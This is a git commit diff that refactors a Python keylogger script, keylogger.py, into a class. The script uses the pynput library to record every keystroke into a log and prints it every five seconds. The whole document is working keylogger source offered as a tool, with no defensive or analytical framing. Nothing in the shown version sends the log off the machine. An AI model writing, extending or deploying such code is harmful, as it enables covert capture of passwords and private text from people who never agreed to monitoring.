1e35806d1ec69c3a8c7e433538eb229dd26a8d8e
AmarjeetKhasyap <amarjeetd956@gmail.com>
2019-10-11 03:54:36 -0400

    better readable code

--- keylogger.py
+++ keylogger.py
@@ -3,26 +3,28 @@ import pynput.keyboard
 import threading
 
 log = ""
+class Keylogger:
 
-def process_key_press(key):
-    global log
-    try:
-        log =log +str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log = log + " "
-        else:
+    def process_key_press(self,key):
+        global log
+        try:
+            log =log +str(key.char)
+        except AttributeError:
+            if key == key.space:
+                log = log + " "
+            else:
 
-             log = log + " " + str(key) + " "
+                 log = log + " " + str(key) + " "
 
-def report():
-    global log
-    print(log)
-    log = ""
-    timer = threading.Timer(5,report)
-    timer.start()
+    def report(self):
+        global log
+        print(log)
+        log = ""
+        timer = threading.Timer(5,self.report)
+        timer.start()
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
 
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
-with keyboard_listener:
-    report()
-    keyboard_listener.join()
